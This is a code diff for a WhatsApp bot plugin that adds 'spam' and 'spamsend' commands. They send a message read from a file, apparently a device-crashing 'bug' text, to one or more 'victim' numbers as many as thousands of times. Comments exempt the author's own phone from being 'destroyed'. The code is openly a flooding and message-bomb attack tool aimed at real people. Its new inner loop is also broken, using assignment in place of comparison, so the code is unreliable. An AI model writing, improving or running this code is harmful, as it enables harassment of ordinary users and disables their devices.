@@ -5,24 +5,31 @@ import moment from 'moment-timezone'
 let handler = async (m, { isurt , conn, args , command, text, usedPrefix }) => {
 
 
-
+    
 
     //if (!isurt) throw `Error`
-
-    moment.tz.setDefault("Asia/Colombo").locale("id");
+    
+    // moment.tz.setDefault("Asia/Colombo").locale("id");
 
     
-let victim = text.split("/")[0]
+let victim = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.split("/")[0]
+let c = victim.replace(/@s.whatsapp.net/g, '')
+let c1 = c.replace(/@whatsapp.net/g, '')
+//let c2 = c.replace("0", "");
 let count = text.split("/")[1]
+let numbers = c1.split(",")
+
 
 
 if (!victim) throw `! Enter Victim number and count correctly [ ex :- .spam 94778115292/2000 ] (Default count is 1000)`
 
 if (!count) { count = 1000}
 
-if (victim.includes (` `)) throw `no spaces`
-if (victim.length > 11) throw `! Incorrect Number`
-if (victim.length < 11) throw `! Incorrect Number`
+//if (victim.includes (` `)) throw `no spaces ( ex :- 9477678678)`
+//if (!victim.includes (`94`) ) throw `! Incorrect Number ( ex :- 9477678678)`
+//if (victim.length < 11) throw `! Incorrect Number ( ex :- 9477678678)`
+
+if (command === `spamsend`) {
 
 if (victim.includes (`5292`)) throw `Are You Kidding me ?`
  if (victim.includes (`1056`)) throw `Are you going to destroy Dilshan's samsung galaxy s10+ ? It's not possible`
@@ -44,7 +51,7 @@ let time = d2.toLocaleTimeString(locale, {
 
 
 
-let victim2 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+// let victim2 =  numbers.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 
 
 
@@ -125,6 +132,11 @@ let group10 = `120363024853238048@g.us`*/
 
     // await conn.sendMessage(m.chat, { text : `ꜱᴇɴᴅɪɴɢ **${count *2} ꜱᴘᴀᴍꜱ...` } , { quoted: m } )
 
+
+    
+
+ 
+
 while (i2 < count * 2 ) {
 
 
@@ -133,18 +145,25 @@ while (i2 < count * 2 ) {
 
 let textx = fs.readFileSync(`${spam1}`)
 
-   
+let ii = 0
+
+   while (ii = numbers.length) {
+
+
+    let victims = numbers[ii]+'@s.whatsapp.net'
 
     //await conn.sendText(victim2, textx)
     
     
-   await conn.sendMessage(victim2, { text : `${textx}` })
-   await conn.sendButton(victim2, `${textx}`, `${textx}`, [`${textx}`, `${textx}`], m)
+   await conn.sendMessage(victims, { text : `${textx}` })
+   await conn.sendButton(victims, `${textx}`, `${textx}`, [`${textx}`, `${textx}`], m)
+
+   ii++
+   }
    /*await conn.sendMessage(group1, { text : `${textx}` })
    await conn.sendMessage(group2, { text : `${textx}` })
    await conn.sendMessage(group3, { text : `${textx}` })
    await conn.sendMessage(group4, { text : `${textx}` })
-
    
 
    await conn.sendMessage(group5, { text : `${textx}` })
@@ -195,10 +214,38 @@ let textx = fs.readFileSync(`${spam1}`)
 //await conn.sendMessage(`94778115292@whatsapp.net`, { text : `Succesfully spammed ${count} number wa.me/${victim}` } , { quoted: m } )
 // await conn.sendText(`94778115292@whatsapp.net` , `Succesfully spammed number wa.me/${victim}`)
  
+
+    }
+
+
+
+
+
+
+
+
+
+
+    if (command === `spam`) {
+
+
+        conn.sendButton(m.chat, 'Please Confirm it ,', `Urt_Bug Bot`, null, [['confirm', `.spamsend ${text}`]], m)
+
+
+
+
+        
+
+    }
+
+
+
+
+
 }
 
 
 
-handler.command = /^(spam)$/i
+handler.command = /^(spam|spamsend)$/i
 handler.admin = true
 export default handler
